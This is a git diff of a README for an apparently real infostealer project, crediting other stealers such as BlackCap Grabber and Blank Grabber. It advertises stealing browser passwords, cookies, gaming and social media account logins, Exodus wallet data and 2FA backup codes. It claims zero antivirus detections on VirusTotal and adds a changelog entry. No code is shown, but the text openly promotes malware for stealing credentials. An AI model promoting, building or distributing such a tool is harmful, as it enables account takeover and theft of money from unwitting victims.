@@ -67,17 +67,26 @@ Love ❌ Ice ✅
 > Default:
 
 - Steal Steam / Minecraft / Roblox / Fortnite / Google / Netflix / Discord / Facebook / Amazon / Ebay / Instagram / Epic Games and much more!
-- Steal Chrome Passwords / Cookies / History
-- Grab System Informations
-- Steal all Chromium Passwords and Cookies for OperaGX/Opera/GoogleChrome/Brave/Chromium/Torch/Edge/Mozilla and others (💎)
-- 0/64 Detect Virus Total (.exe) (💎)
-- Grabb Sensitive Files exodus login / a2f backup codes / tokens / passwords... (can be customizable) (💎)
+- Steal Chrome Passwords / Cookies / History.
+- Grab System Informations.
+- Grab IP Address
+- Steal all Chromium Passwords and Cookies for OperaGX/Opera/GoogleChrome/Brave/Chromium/Torch/Edge/Mozilla and others!
+- 0/64 Detect Virus Total (.exe)
+- Grabb Sensitive Files exodus login / a2f backup codes / tokens / passwords...
 ```
 ## <a id="changelog"></a>📝 〢 ChangeLog
 
 ```diff
-*dd/mm/yy*
-v1.0 ⋮ 23-11-2022
+dd/mm/yy
+
+V1.01 ⋮ 24/11/2022
+- Fixed Major Bugs
+- Improved the code
+- Improved ReadMe.md
+- Added a license for this repo
+- Improved Discord Server
+
+v1.0 ⋮ 23/11/2022
 - Released first private version.
 - Made all of the main features
 - Made the readme.md
@@ -88,7 +97,7 @@ v1.0 ⋮ 23-11-2022
 ### Authors
 - [iceeburr](https://github.com/iceeburr)
 
-### Contributors (CapingTeam)
+### Contributors
 - Currently None
 
 ### <a id="Credits"></a>🕵️‍♂️ 〢 Big Thank You To These Repos:
@@ -97,6 +106,7 @@ v1.0 ⋮ 23-11-2022
 - Wasp-stealer
 - [BlackCap Grabber](https://github.com/KSCHdsc/BlackCap-Grabber)
 - [Creal Stealer](https://github.com/Ayhuuu/Creal-Stealer)
+- [Blank Grabber](https://github.com/Blank-c/Blank-Grabber)
 
 ### <a id="Terms"></a>💼 〢 Term of usage
 
